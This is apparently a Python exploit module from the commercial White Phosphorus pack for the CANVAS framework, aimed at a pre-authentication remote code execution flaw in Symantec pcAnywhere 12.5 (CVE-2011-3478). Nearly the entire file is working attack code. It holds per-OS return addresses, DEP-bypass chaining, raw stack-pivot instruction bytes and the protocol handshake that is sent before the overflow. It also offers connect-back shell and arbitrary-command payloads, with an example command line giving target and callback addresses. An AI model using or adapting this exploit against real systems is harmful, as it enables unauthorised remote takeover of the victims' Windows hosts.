
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


NAME = "Symantec pcAnywhere awhost32 Remote Code Execution"
DESCRIPTION = "Exploits a pre-auth remote code execution vulnerability in Symantec PCAnywhere v12.5"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Symantec'
DOCUMENTATION["Date public"] = "2012-01-25"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2011-3478"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3478'
DOCUMENTATION['CVSS'] = '9.7'
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-12-018/"
DOCUMENTATION["Notes"] = """
When run via CANVAS gui this module migrates and restarts the 'awhost32' service automatically. This must be done manually if run via the command line.

Target application limits shellcode options.
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]

NOTES="""
When run via CANVAS gui this module migrates and restarts the 'awhost32' service automatically upon exploitation. This must be done manually if run via the command line.

Target application limits shellcode options.

------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Symantec pcAnywhere awhost32 Remote Code Execution
------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Autoversioning
1: Windows 2003 Universal (DEP)
2: Windows XP Universal (DEP)
3: Windows 2000

Payloads:
0: TCP Connect Back
1: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_symantec_pcanywhere_awhost32/wp_symantec_pcanywhere_awhost32.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 5631

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x0000), []],
    1 : ["Windows 2003 Universal (DEP)", (0x0000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP Universal (DEP)", (0x0000), [WINXPSP2, WINXPSP3]],
    3 : ["Windows 2000", (0x0000), [WIN2K]]
}

class theexploit(wp_exploit):
    PAYLOADS=["TCP Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.alignstack = True
        self.revertToSelf = False
        self.suspendThreads = True
        self.createThread = False
        self.postactions+=[("mosdefmigrate", []),("restart service",["awhost32"])]
        return

    def usage(self):
        self.wp_usage(targets)
        return  

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        payload = '\x06'
        payload += wp_randomstring(1392-len(payload))
        if self.version == 1: # 2003
            payload += pack('<L', 0x028F5AD4)
            payload += pack('<L', (0x028F5ADC-8))
        if self.version == 2: # XP
            payload += pack('<L', 0x028D5AD4)
            payload += pack('<L', (0x028D5ADC-8))
        elif self.version == 3: # 2000
            payload += pack('<L', 0x02B85AD4)
            payload += pack('<L', (0x02B85ADC-8))
        payload += wp_randomstring(4)
        payload += pack('<L', 0x67F7A65E)
        payload += wp_randomstring(4)
        if self.version == 1: # 2003
            payload += self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+128)
        elif self.version == 2: # XP
            payload += self.wp_UniversalDEPBypassWinXP_VP(len(self.shellcode)+128)
        elif self.version == 3: # 2000
            payload += pack('<L', 0x67F78892) # push esp;ret
        payload += '\x33\xc0' # xor eax, eax
        payload += '\xb0\x04' # mov al, 4
        payload += '\x64\x8b\x20' # mov esp, fs:[eax]
        payload += '\x83\xEC\x08' # sub esp, 8
        payload += self.shellcode
        payload += wp_randomstring(0xA90-len(payload))
        return payload

    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        payload = self.makesploit()        
        self.result_error = 0
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.send("\x00\x00\x00\x00")
            reply = s.recv(2048)
            if not 'Please press <Enter>' in reply:
                self.log("WP> Invalid response from server - pcAnywhere Host Service not found")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0

            s.send("\x6f\x06\xff")
            reply = s.recv(2048)

            s.send("\x6f\x61\x00\x09\x00\xff\x00\x00\xff\xff\x00\x00\x01\x00")
            reply = s.recv(2048)

            s.send("\x6f\x62\x01\x02\x00\x00\x00")
            reply = s.recv(2048)

            s.send(payload)
 
            time.sleep(5)
            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        time.sleep(5)

        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
